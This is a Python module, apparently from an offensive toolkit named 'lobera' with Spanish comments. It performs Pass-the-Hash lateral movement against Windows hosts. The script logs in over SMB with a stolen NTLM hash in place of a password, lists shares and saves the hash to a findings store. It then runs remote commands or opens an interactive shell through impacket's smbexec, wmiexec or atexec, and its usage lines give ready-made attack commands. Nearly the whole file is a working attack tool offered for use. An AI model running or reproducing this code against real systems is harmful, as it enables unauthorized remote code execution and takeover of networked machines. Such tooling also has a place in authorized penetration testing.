# scripts/smb/attack/pass_the_hash.py
"""
Pass-the-Hash — lateral movement con hash NTLM sin conocer la contraseña.

Uso:
  python lobera.py smb -t 10.10.10.5 --script=pass-the-hash -u Administrator -H aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c
  python lobera.py smb -t 10.10.10.5 --script=pass-the-hash -u Administrator -H :8846f7eaee8fb117ad06bdd830b7586c --exec "whoami"
  python lobera.py smb -t 10.10.10.5 --script=pass-the-hash -u Administrator -H :HASH --shell

Requiere: impacket
"""

from impacket.smbconnection import SMBConnection
from impacket.dcerpc.v5 import transport, scmr
from impacket.dcerpc.v5.dcom import wmi
from impacket.dcerpc.v5.dcomrt import DCOMConnection

from core.output import console, print_result
from core import session_db


def _split_hash(h: str):
    """Acepta :NTLM o LM:NTLM"""
    if ':' in h:
        lm, nt = h.split(':', 1)
        return lm or 'aad3b435b51404eeaad3b435b51404ee', nt
    return 'aad3b435b51404eeaad3b435b51404ee', h


class Script:
    NAME        = "pass-the-hash"
    DESCRIPTION = "Lateral movement con hash NTLM (PtH) vía SMB/WMIEXEC"

    def __init__(self, target, creds):
        self.target = target
        self.creds  = creds

    def run(self, args):
        target  = str(self.target.ip)
        user    = getattr(args, 'username', None) or (self.creds.username if self.creds else None)
        domain  = getattr(args, 'domain',   '') or (self.creds.domain   if self.creds else '')
        hash_   = getattr(args, 'hash',     None) or (self.creds.hash   if self.creds else None)
        cmd     = getattr(args, 'exec',     None)
        shell   = getattr(args, 'shell',    False)
        method  = getattr(args, 'method',   'smbexec')  # smbexec | wmiexec | atexec

        if not user or not hash_:
            console.print("[red]Falta -u USER y -H HASH (formato LM:NT o :NT)[/red]")
            return

        lm_hash, nt_hash = _split_hash(hash_)

        console.print(f"  [bold]Pass-the-Hash[/bold] → {domain}\\{user}@{target}")
        console.print(f"  NT hash: [cyan]{nt_hash[:8]}...{nt_hash[-8:]}[/cyan]  método: {method}")

        # ── Verificar autenticación ────────────────────────────────────────────
        try:
            smb = SMBConnection(target, target, timeout=10)
            smb.login(user, '', domain, lm_hash, nt_hash)
            console.print(f"  [bold green]✓ Autenticado[/bold green] — {domain}\\{user}@{target}")
        except Exception as e:
            console.print(f"  [red]✗ Autenticación fallida: {e}[/red]")
            return

        session_db.save_finding(
            category="pass_the_hash",
            data={"target": target, "user": user, "domain": domain, "nt_hash": nt_hash, "method": method}
        )

        if not cmd and not shell:
            # Solo verificar autenticación
            shares = []
            try:
                for s in smb.listShares():
                    shares.append(s['shi1_netname'][:-1])
            except Exception:
                pass
            if shares:
                console.print(f"  Shares: [cyan]{', '.join(shares)}[/cyan]")
            console.print("\n  [bold]Para ejecutar comandos:[/bold]")
            console.print(f"    [cyan]lobera smb -t {target} --script=pass-the-hash -u {user} -H :{nt_hash} --exec 'whoami'[/cyan]")
            console.print(f"    [cyan]lobera smb -t {target} --script=pass-the-hash -u {user} -H :{nt_hash} --shell[/cyan]")
            smb.logoff()
            return

        smb.logoff()

        # ── Ejecución remota ───────────────────────────────────────────────────
        if method == 'wmiexec':
            self._wmiexec(target, domain, user, lm_hash, nt_hash, cmd, shell)
        elif method == 'atexec':
            self._atexec(target, domain, user, lm_hash, nt_hash, cmd)
        else:
            self._smbexec(target, domain, user, lm_hash, nt_hash, cmd, shell)

    # ── SMBExec ───────────────────────────────────────────────────────────────

    def _smbexec(self, target, domain, user, lm_hash, nt_hash, cmd, shell):
        try:
            from impacket.examples.smbexec import SMBEXEC
        except ImportError:
            console.print("  [yellow]smbexec no disponible, usando wmiexec[/yellow]")
            self._wmiexec(target, domain, user, lm_hash, nt_hash, cmd, shell)
            return

        if shell:
            console.print("  [bold green]Shell interactiva SMBExec[/bold green] (escribe 'exit' para salir)")
            try:
                e = SMBEXEC(user, '', domain, lm_hash, nt_hash, target, None, None, 'SHARE')
                e.run(target)
            except Exception as ex:
                console.print(f"  [red]Error: {ex}[/red]")
        else:
            try:
                e = SMBEXEC(user, '', domain, lm_hash, nt_hash, target, None, None, 'SHARE')
                e.execute_remote(cmd)
            except Exception as ex:
                console.print(f"  [red]Error: {ex}[/red]")

    # ── WMIExec ───────────────────────────────────────────────────────────────

    def _wmiexec(self, target, domain, user, lm_hash, nt_hash, cmd, shell):
        try:
            from impacket.examples.wmiexec import WMIEXEC
            if shell:
                console.print("  [bold green]Shell interactiva WMIExec[/bold green]")
                e = WMIEXEC(target, user, '', domain, lm_hash, nt_hash, None, None, False, 'c$', False)
                e.run(target)
            else:
                e = WMIEXEC(target, user, '', domain, lm_hash, nt_hash, None, None, False, 'c$', False)
                e.execute_remote(cmd)
        except Exception as ex:
            console.print(f"  [red]WMIExec error: {ex}[/red]")

    # ── ATExec ────────────────────────────────────────────────────────────────

    def _atexec(self, target, domain, user, lm_hash, nt_hash, cmd):
        try:
            from impacket.examples.atexec import TSCH_EXEC
            e = TSCH_EXEC(user, '', domain, lm_hash, nt_hash, cmd, None, None, target)
            e.play()
        except Exception as ex:
            console.print(f"  [red]ATExec error: {ex}[/red]")
